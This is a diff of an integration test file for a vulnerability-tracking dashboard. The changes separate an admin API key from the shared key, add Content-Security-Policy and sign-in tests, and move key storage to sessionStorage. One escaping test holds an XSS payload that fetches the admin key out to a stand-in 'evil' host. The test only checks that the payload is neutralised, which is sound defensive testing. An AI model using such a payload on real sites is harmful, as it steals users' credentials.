@@ -5,6 +5,7 @@ import { prisma } from '../../db/client.js';
 import { ECOSYSTEM_COUNTS_CACHE_TTL_MS } from './dashboard.js';
 
 const API_KEY = 'test-api-key'; // matches vitest.integration.config.ts
+const ADMIN_API_KEY = 'test-admin-key'; // likewise
 
 describe('dashboard', () => {
   let app: FastifyInstance;
@@ -33,13 +34,17 @@ describe('dashboard', () => {
       const res = await app.inject({
         method: 'GET',
         url: '/api/v1/import-status',
-        headers: { 'x-api-key': [API_KEY, 'wrong'] as unknown as string },
+        headers: { 'x-api-key': [ADMIN_API_KEY, 'wrong'] as unknown as string },
       });
       expect(res.statusCode).toBe(401);
     });
 
-    it('accepts the configured API key', async () => {
-      expect((await get({ 'x-api-key': API_KEY })).statusCode).toBe(200);
+    it('accepts the admin key', async () => {
+      expect((await get({ 'x-api-key': ADMIN_API_KEY })).statusCode).toBe(200);
+    });
+
+    it('rejects the shared API key, which every client holds', async () => {
+      expect((await get({ 'x-api-key': API_KEY })).statusCode).toBe(401);
     });
 
     describe('per-ecosystem count caching', () => {
@@ -85,24 +90,24 @@ describe('dashboard', () => {
       it('does not reflect a DB change made within the cache TTL', async () => {
         forceCacheMiss();
         await seedOneVulnerability('a');
-        const first = (await get({ 'x-api-key': API_KEY })).json();
+        const first = (await get({ 'x-api-key': ADMIN_API_KEY })).json();
         expect(countFor(first)).toBe(1);
 
         await seedOneVulnerability('b');
-        const second = (await get({ 'x-api-key': API_KEY })).json();
+        const second = (await get({ 'x-api-key': ADMIN_API_KEY })).json();
         expect(countFor(second)).toBe(1); // still cached, not 2
       });
 
       it('refreshes once the cache TTL has elapsed', async () => {
         forceCacheMiss();
         await seedOneVulnerability('c');
-        const before = (await get({ 'x-api-key': API_KEY })).json();
+        const before = (await get({ 'x-api-key': ADMIN_API_KEY })).json();
         expect(countFor(before)).toBe(1);
 
         await seedOneVulnerability('d');
         vi.setSystemTime(Date.now() + ECOSYSTEM_COUNTS_CACHE_TTL_MS + 1);
 
-        const after = (await get({ 'x-api-key': API_KEY })).json();
+        const after = (await get({ 'x-api-key': ADMIN_API_KEY })).json();
         expect(countFor(after)).toBe(2);
       });
     });
@@ -132,7 +137,7 @@ describe('dashboard', () => {
         await prisma.collectionJob.create({ data: { source: 'osv-Debian:13', status: 'completed', startedAt: new Date(0), completedAt: new Date(0) } });
         await prisma.jobConfig.create({ data: { source: 'osv-Debian', enabled: true } });
 
-        const row = (await get({ 'x-api-key': API_KEY })).json().osvEcosystems.find((e: { ecosystem: string }) => e.ecosystem === ecosystem);
+        const row = (await get({ 'x-api-key': ADMIN_API_KEY })).json().osvEcosystems.find((e: { ecosystem: string }) => e.ecosystem === ecosystem);
 
         expect(row).toMatchObject({ source: 'osv-Debian', enabled: true, status: 'failed', errorMessage: 'frozen bucket' });
       });
@@ -158,16 +163,16 @@ describe('dashboard', () => {
     it('escapes values that reach innerHTML', async () => {
       // The dashboard renders values it does not control: OSV ecosystem names
       // come from upstream data, and errorMessage is whatever a failing fetcher
-      // produced. Both are interpolated into innerHTML, and the API key lives
-      // in localStorage, so an injected script would be able to read it.
-      // esc() is defined inside the page's own <script>, so this exercises the
+      // produced. Both are interpolated into innerHTML, and the admin key lives
+      // in sessionStorage, so an injected script would be able to read it.
+      // esc() is taken from the script the page loads, so this exercises the
       // shipped implementation rather than a copy of it.
-      const html = (await app.inject({ method: 'GET', url: '/dashboard' })).body;
-      const escSource = html.match(/function esc\(v\) \{[\s\S]*?\n {4}\}/)?.[0];
-      expect(escSource, 'esc() must exist in the served page').toBeDefined();
+      const js = (await app.inject({ method: 'GET', url: '/dashboard.js' })).body;
+      const escSource = js.match(/function esc\(v\) \{[\s\S]*?\n\}/)?.[0];
+      expect(escSource, 'esc() must exist in the served script').toBeDefined();
 
       const esc = new Function(`${escSource}; return esc;`)() as (v: unknown) => string;
-      const payload = `<img src=x onerror="fetch('//evil/'+localStorage.getItem('heretix_api_key'))">`;
+      const payload = `<img src=x onerror="fetch('//evil/'+sessionStorage.getItem('heretix_admin_api_key'))">`;
       const escaped = esc(payload);
 
       expect(escaped).not.toMatch(/[<>]/);
@@ -179,11 +184,43 @@ describe('dashboard', () => {
       // Job sources are interpolated into the action buttons; inside an
       // onclick they would sit in an HTML-attribute *and* a JS-string context
       // at once. Data attributes plus delegation leave only the former.
+      const js = (await app.inject({ method: 'GET', url: '/dashboard.js' })).body;
+      expect(js).not.toMatch(/onclick="(runJob|toggleJob)/);
+      expect(js).toContain('data-action="run"');
+      expect(js).toContain('data-action="toggle"');
+    });
+
+    it('loads its script and styles from this server only, under a CSP that refuses inline script', async () => {
+      // A script from a CDN could read the admin key; so could one injected
+      // into the markup, which the CSP keeps from running.
+      const res = await app.inject({ method: 'GET', url: '/dashboard' });
+      expect(res.body).not.toMatch(/<script>|<style>|onclick=|https?:\/\//);
+      expect(res.body).toContain('<script src="/dashboard.js"></script>');
+      const csp = res.headers['content-security-policy'] as string;
+      expect(csp).toContain("default-src 'none'");
+      expect(csp).toContain("script-src 'self'");
+      expect(csp).not.toContain('unsafe-inline');
+
+      for (const [url, type] of [['/dashboard.js', 'text/javascript'], ['/dashboard.css', 'text/css']]) {
+        const file = await app.inject({ method: 'GET', url });
+        expect(file.statusCode).toBe(200);
+        expect(file.headers['content-type']).toContain(type);
+      }
+    });
+
+    it('opens on a sign-in screen, with the dashboard hidden until the server accepts the key', async () => {
       const html = (await app.inject({ method: 'GET', url: '/dashboard' })).body;
-      expect(html).not.toMatch(/onclick="runJob/);
-      expect(html).not.toMatch(/onclick="toggleJob/);
-      expect(html).toContain('data-action="run"');
-      expect(html).toContain('data-action="toggle"');
+      expect(html).toContain('id="sign-in-form"');
+      expect(html).toContain('id="dashboard" class="page hidden"');
+      const js = (await app.inject({ method: 'GET', url: '/dashboard.js' })).body;
+      // 401 on any request goes back to the sign-in screen and forgets the key.
+      expect(js).toMatch(/status === 401\) \{\s*signOut\(/);
+    });
+
+    it('keeps the admin key for the tab only', async () => {
+      const js = (await app.inject({ method: 'GET', url: '/dashboard.js' })).body;
+      expect(js).toContain('sessionStorage');
+      expect(js).not.toContain('localStorage');
     });
   });
 });
